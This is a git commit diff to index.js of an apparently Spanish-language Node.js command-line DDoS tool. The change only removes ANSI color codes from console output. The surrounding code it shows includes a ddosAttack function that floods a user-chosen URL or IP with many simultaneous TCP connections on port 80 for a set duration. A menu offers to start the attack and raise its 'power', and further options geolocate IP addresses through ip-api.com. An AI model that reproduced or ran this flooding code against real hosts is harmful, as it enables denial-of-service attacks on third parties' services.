c740a2bda1989a8866848511b9a896c184ce883a
Keiji <127261198+Keiji821@users.noreply.github.com>
2024-08-29 18:35:50 -0400

    Actualizar index.js

--- index.js
+++ index.js
@@ -4,42 +4,6 @@ const rl = require('readline').createInterface({
   output: process.stdout
 });
 
-const colors = {
-  reset: '[0m',
-  bright: '[1m',
-  dim: '[2m',
-  underscore: '[4m',
-  blink: '[5m',
-  reverse: '[7m',
-  hidden: '[8m',
-  fg: {
-    black: '[30m',
-    red: '[31m',
-    green: '[32m',
-    yellow: '[33m',
-    blue: '[34m',
-    magenta: '[35m',
-    cyan: '[36m',
-    white: '[37m',
-  },
-  bg: {
-    black: '[40m',
-    red: '[41m',
-    green: '[42m',
-    yellow: '[43m',
-    blue: '[44m',
-    magenta: '[45m',
-    cyan: '[46m',
-    white: '[47m',
-  }
-};
-
-const decorations = {
-  underline: '[4m',
-  bold: '[1m',
-  italic: '[3m',
-};
-
 const async = require('async');
 const axios = require('axios');
 const lolcat = require('lolcat');
@@ -48,18 +12,18 @@ const { exec } = require('child_process');
 
 const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
-console.log(`[32m[1m Iniciando ataque DDoS...`);
+console.log(`Iniciando ataque DDoS...`);
 const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
 socket.connect(80, url, () => {
-console.log(`[31m[1m
+console.log(`    
  ╭────────────────────────────────╮
  │ ⚠️ Conectado a ${url}   │
  ╰────────────────────────────────╯`);
 });
 socket.on('data', (data) => {
-console.log(`[33m[1m Dato recibido de ${url}`);
+console.log(`Dato recibido de ${url}`);
 });
 socket.on('error', (err) => {
 console.error(`Error: ${err}`);
@@ -68,7 +32,7 @@ sockets.push(socket);
 }
 
 setTimeout(() => {
-console.log('[32m[1m Ataque finalizado');
+console.log('Ataque finalizado');
 sockets.forEach((socket) => socket.destroy());
 }, attackDuration * 1000);
 } catch (error) {
@@ -78,13 +42,13 @@ console.error(`Error: ${error}`);
 
 const updateCode = async () => {
 try {
-console.log(`[36m[1m Actualizando código...`);
+console.log(`Actualizando código...`);
 const exec = require('child_process').exec;
 exec('git pull origin main', (error, stdout, stderr) => {
 if (error) {
 console.error(`Error: ${error}`);
 } else {
-console.log(`[32m[1m Código actualizado correctamente!`);
+console.log(`Código actualizado correctamente!`);
 }
 });
 } catch (error) {
@@ -231,33 +195,33 @@ try {
 const response = await axios.get(`http://ip-api.com/json/${ip}`);
 const data = response.data;
 console.log(` `);
-console.log(`[32m[1m 
+console.log(`      
         ╭─────────────────────────╮
         │ 🌕 Información de la IP │
         ╰─────────────────────────╯`);
-console.log(`[32m[1m       〔[36m01[32m〕  [31m[1m IP: [36m ${data.query}`);
-console.log(`[32m[1m       〔[36m02[32m〕  [31m[1m Estatus: [36m ${data.status}`);
-console.log(`[32m[1m       〔[36m03[32m〕  [31m[1m Continente: [36m ${data.continent}`);
-console.log(`[32m[1m       〔[36m04[32m〕  [31m[1m Código del continente: [36m ${data.continentCode}`);
-console.log(`[32m[1m       〔[36m05[32m〕  [31m[1m País: [36m ${data.country}`);
-console.log(`[32m[1m       〔[36m06[32m〕  [31m[1m Código del país: [36m ${data.countryCode}`);
-console.log(`[32m[1m       〔[36m07[32m〕  [31m[1m Región: [36m ${data.region}`);
-console.log(`[32m[1m       〔[36m08[32m〕  [31m[1m Estado: [36m ${data.regionName}`);
-console.log(`[32m[1m       〔[36m09[32m〕  [31m[1m Ciudad: [36m ${data.city}`);
-console.log(`[32m[1m       〔[36m10[32m〕  [31m[1m  Distrito: [36m ${data.district}`);
-console.log(`[32m[1m       〔[36m11[32m〕  [31m[1m  Código postal: [36m ${data.zip}`);
-console.log(`[32m[1m       〔[36m12[32m〕  [31m[1m  Latitud: [36m ${data.lat}`);
-console.log(`[32m[1m       〔[36m13[32m〕  [31m[1m  Longitud: [36m ${data.lon}`);
-console.log(`[32m[1m       〔[36m14[32m〕  [31m[1m  Zona horaria: [36m ${data.timezone}`);
-console.log(`[32m[1m       〔[36m15[32m〕  [31m[1m  Offset: [36m ${data.offset}`);
-console.log(`[32m[1m       〔[36m16[32m〕  [31m[1m  Moneda: [36m ${data.currency}`);
-console.log(`[32m[1m       〔[36m17[32m〕  [31m[1m  ISP: [36m ${data.isp}`);
-console.log(`[32m[1m       〔[36m18[32m〕  [31m[1m  Empresa: [36m ${data.org}`);
-console.log(`[32m[1m       〔[36m19[32m〕  [31m[1m  AS: [36m ${data.as}`);
-console.log(`[32m[1m       〔[36m20[32m〕  [31m[1m  Nombre de AS: [36m ${data.asname}`);
-console.log(`[32m[1m       〔[36m21[32m〕  [31m[1m  Es un celular: [36m ${data.mobile}`);
-console.log(`[32m[1m       〔[36m22[32m〕  [31m[1m  Es un proxy: [36m ${data.proxy}`);
-console.log(`[32m[1m       〔[36m23[32m〕  [31m[1m  Es un hosting: [36m ${data.hosting}`);
+console.log(`IP: ${data.query}`);
+console.log(`Estatus: ${data.status}`);
+console.log(`Continente: ${data.continent}`);
+console.log(`Código del continente: ${data.continentCode}`);
+console.log(`País: ${data.country}`);
+console.log(`Código del país: ${data.countryCode}`);
+console.log(`Región: ${data.region}`);
+console.log(`Estado: ${data.regionName}`);
+console.log(`Ciudad: ${data.city}`);
+console.log(`Distrito: ${data.district}`);
+console.log(`Código postal: ${data.zip}`);
+console.log(`Latitud: ${data.lat}`);
+console.log(`Longitud: ${data.lon}`);
+console.log(`Zona horaria: ${data.timezone}`);
+console.log(`Offset: ${data.offset}`);
+console.log(`Moneda: ${data.currency}`);
+console.log(`ISP: ${data.isp}`);
+console.log(`Empresa: ${data.org}`);
+console.log(`AS: ${data.as}`);
+console.log(`Nombre de AS: ${data.asname}`);
+console.log(`Es un celular: ${data.mobile}`);
+console.log(`Es un proxy: ${data.proxy}`);
+console.log(`Es un hosting:${data.hosting}`);
 } catch (error) {
 console.error(`Error: ${error.message}`);
 }
@@ -269,17 +233,17 @@ const showMenu = () => {
   console.log('ATOMIC| lolcat')
   console.log('[36m[1m      ⭐️ Desarrollado por Keiji821');
   console.log('                ');
-  console.log('[32m【1[32m】 [37m[1m Iniciar ataque DDoS');
-  console.log('[32m【2[32m】 [37m[1m Actualizar código');
-  console.log('[32m【3[32m】 [37m[1m Configurar conexiones simultáneas');
-  console.log('[32m【4[32m】 [37m[1m Aumentar potencia del ataque');
-  console.log('[32m【5[32m】 [37m[1m Información de DNS para una dirección IP');
-  console.log('[32m【6[32m】 [37m[1m Análisis de IP');
-  console.log('[32m【7[32m】 [37m[1m Información geográfica de IP');
+  console.log('Iniciar ataque DDoS');
+  console.log('Actualizar código');
+  console.log('Configurar conexiones simultáneas');
+  console.log('Aumentar potencia del ataque');
+  console.log('Información de DNS para una dirección IP');
+  console.log('Análisis de IP');
+  console.log('Información geográfica de IP');
   console.log('               ');
-  console.log('[32m【0[32m】❌️ [31m[1m Salir');
+  console.log('Salir');
   console.log('               ');
-  rl.setPrompt('[37m[1m ｢🌐｣➤ ');
+  rl.setPrompt('｢🌐｣➤ ');
   rl.prompt();
 };
 
@@ -291,10 +255,10 @@ let attackDuration = 60; // Duración del ataque por defecto
 rl.on('line', (option) => {
 switch (option.trim()) {
 case '1':
-console.log('[36m[1m Ingrese la URL del objetivo');
-rl.question('[32m[1m URL/IP: ', (url) => {
+console.log('Ingrese la URL del objetivo');
+rl.question('URL/IP: ', (url) => {
 if (url === '') {
-console.log('[31m[1m Url o ip invalida');
+console.log('Url o ip invalida');
 showMenu();
 } else {
 ddosAttack(url, numConnections, attackDuration);
@@ -307,36 +271,36 @@ updateCode();
 showMenu();
 break;
 case '3':
-console.log('[36m[1m Ingrese el número de conexiones simultaneas');
-rl.question('[32m[1m Conexiones: ', (conexiones) => {
+console.log('Ingrese el número de conexiones simultaneas');
+rl.question('Conexiones: ', (conexiones) => {
 if (conexiones === '') {
-console.log('[31m[1m Valor invalido');
+console.log('Valor invalido');
 showMenu();
 } else {
 numConnections = parseInt(conexiones);
-console.log(`[36m[1m Conexiones simultaneas establecidas en ${numConnections}`);
+console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
 showMenu();
 }
 });
 break;
 case '4':
-console.log('[36m[1m Ingrese la duración del ataque (en segundos)');
-rl.question('[32m[1m Duración: ', (duration) => {
+console.log('Ingrese la duración del ataque (en segundos)');
+rl.question('Duración: ', (duration) => {
 if (duration === '') {
-console.log('[31m[1m Valor invalido');
+console.log('Valor invalido');
 showMenu();
 } else {
 attackDuration = parseInt(duration);
-console.log(`[32m[1m Duración del ataque establecida en ${attackDuration} segundos`);
+console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
 showMenu();
 }
 });
 break;
 case '5':
-console.log('[36m[1m Ingrese la IP para obtener información');
-rl.question('[32m[1m IP: ', (ip) => {
+console.log('Ingrese la IP para obtener información');
+rl.question('IP: ', (ip) => {
 if (ip === '') {
-console.log('[31m[1m IP invalida');
+console.log('IP invalida');
 showMenu();
 } else {
 getInfo(ip);
@@ -345,26 +309,26 @@ showMenu();
 });
 break;
 case '6':
-console.log('[36m[1m Ingrese la ip o dominio para el análisis ');
-rl.question('[32m[1m IP/Dominio: ', (ip) => {
+console.log('Ingrese la ip o dominio para el análisis ');
+rl.question('IP/Dominio: ', (ip) => {
 if (ip === '') {
-console.log('[31m[1m Ip o dominio invalido');
+console.log('Ip o dominio invalido');
 showMenu();
 } else {
 try {
 analyzeIP(ip);
 } catch (error) {
-console.error(`[31m[1m Error al analizar IP: ${error.message}`);
+console.error(`Error al analizar IP: ${error.message}`);
 }
 showMenu();
 }
 });
 break;
 case '7':
-console.log('[36m[1m Ingrese la ip o dominio para obtener información geográfica');
-rl.question('[32m[1m IP/Dominio: ', (ip) => {
+console.log('Ingrese la ip o dominio para obtener información geográfica');
+rl.question('IP/Dominio: ', (ip) => {
 if (ip === '') {
-console.log('[36m[1m Ip o dominio invalido');
+console.log('Ip o dominio invalido');
 showMenu();
 } else {
 getGeoIP(ip);
@@ -373,11 +337,11 @@ showMenu();
 });
 break;
 case '0':
-console.log('[32m[1m Saliendo...');
+console.log('Saliendo...');
 process.exit();
 break;
 default:
-console.log('[31m[1m Opción invalida');
+console.log('Opción invalida');
 showMenu();
 }
 }).on('close', () => {
